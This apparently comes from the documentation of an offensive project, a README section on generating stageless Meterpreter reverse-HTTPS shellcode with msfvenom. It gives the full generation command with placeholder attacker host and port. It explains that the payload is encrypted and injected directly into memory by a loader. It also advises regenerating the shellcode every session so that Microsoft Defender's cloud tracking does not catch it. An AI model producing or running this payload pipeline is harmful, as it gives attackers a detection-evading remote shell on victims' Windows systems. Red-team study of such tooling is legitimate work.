# Shellcode Generation

## Tool
msfvenom: part of the Metasploit Framework

## Command
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=YOUR_LHOST LPORT=YOUR_PORT -f raw -o shellcode.bin
```

## Staged vs Stageless

| | Staged | Stageless |
|---|---|---|
| Syntax | `meterpreter/reverse_https` (with `/`) | `meterpreter_reverse_https` (with `_`) |
| Size | ~500 bytes | ~255KB |
| How it works | Small stager connects back, downloads full Meterpreter from listener | Full Meterpreter embedded in shellcode |
| Stability | Less stable for process injection | More stable for process injection |
| Detection | Stage download visible on network | Single connection |

**This project uses stageless** — the full Meterpreter payload is embedded in the shellcode, encrypted, and injected directly into memory.

## Output
- `shellcode.bin` — raw unencrypted shellcode
- Run `encrypt.py` after generation to produce `encrypted_shell.bin`

## Notes
- Regenerate shellcode every session — each binary has a unique UUID that Defender cloud-tracks
- Always verify key match between encrypt.py and loader.c before testing